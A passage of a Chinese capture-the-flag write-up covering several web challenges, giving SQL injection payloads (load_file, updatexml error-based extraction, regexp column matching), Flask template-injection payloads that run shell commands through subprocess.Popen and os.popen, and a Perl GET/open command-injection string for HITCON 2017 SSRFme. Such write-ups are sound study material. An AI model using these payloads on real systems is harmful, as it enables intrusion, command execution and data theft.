去读取在 `/tmp` 目录下已经解压但是没被删除的 `/DS_Store` 文件，十六进制读一下
```
category=a',content=hex((select  load_file('/tmp/html/.DS_Store'))),/*
```
发现flag_8946e1ff1ee3e40f.php，再次读取即可

---
# [RCTF2015]EasySQL
- SQL正则

Emails不能有@，先注册一个用户:`1"` 当修改密码时报错

![](https://img-blog.csdnimg.cn/6e2495ff6b194a6695a44641eb638ae5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

可见是双引号包裹，报错注入

```
2"||(updatexml(1,concat(0x7e,database(),0x7e),1))#
2"||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='web_sqli')),0x7e),1))#

2"||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))#
```

真flag在users表中,但是列名没有输出完整

使用正则匹配


>2"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')&&(column_name)regexp('^r'))),1))#

`regexp('^r')是MySql的正则`，^r 匹配开头是r的字段，也就是`column_name=real_flag_1s_her`

得到列名进行查询

>username=mochu7"||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('^f'))),1))#

这里`regexp('^f')`的意思是查找字段中f开头的内容，其实就是在找flag{XXXX}

过滤left right再reverse一下就行了

---
# [CSCCTF 2019 Qual]FlaskLight

- SSTI

![](https://img-blog.csdnimg.cn/549c727e6b704b14a39f5ee8a6e48bc2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/765c6be0f591463d8e53648fc1809f97.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

![](https://img-blog.csdnimg.cn/dadef210f7b3426ca822b1efa4eaeb74.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
```
?search={{''.__class__.__mro__[2].__subclasses__()}}
#爆出所有类
```
利用 `subprocess.Popen`类


一般在258位置

Payload：
```
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
```
或者
```
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /').read()}}
```

---
# **[HITCON 2017]SSRFme
- perl脚本GET open命令漏洞

`GET`是 `Lib for WWW in Perl` 中的命令 目的是模拟http的GET请求,GET函数底层就是调用了`open`处理

open存在命令执行，并且还支持file函数

```php
<?php
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
    }

    echo $_SERVER["REMOTE_ADDR"];

    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);
    @mkdir($sandbox);
    @chdir($sandbox);

    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
    highlight_file(__FILE__);
```
test:能读取根目录

![](https://img-blog.csdnimg.cn/d7e431f655184772a56e416751483f72.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
`当GET使用file协议的时候就会调用到perl的open函数`

open函数`命令执行`格式`open(FD, "ls|");`

`要执行的命令先前必须要有以命令为文件名的文件存在`

然后readflag，如果直接/readflag的话，那么会在服务器的根目录创建这个文件，而不是在网站的那个目录，所以是无法命令执行的，所以可以用bash -c 相当于./readflag，而根据php字符解析特性，如果直接将./readflag传入，那么.就会变成下划线,从而不能命令执行。直接bash的话好像是只能bash 有sh后缀的文件，所以不能用



```
?url=file:bash -c /readflag|&filename=bash -c /readflag|
```



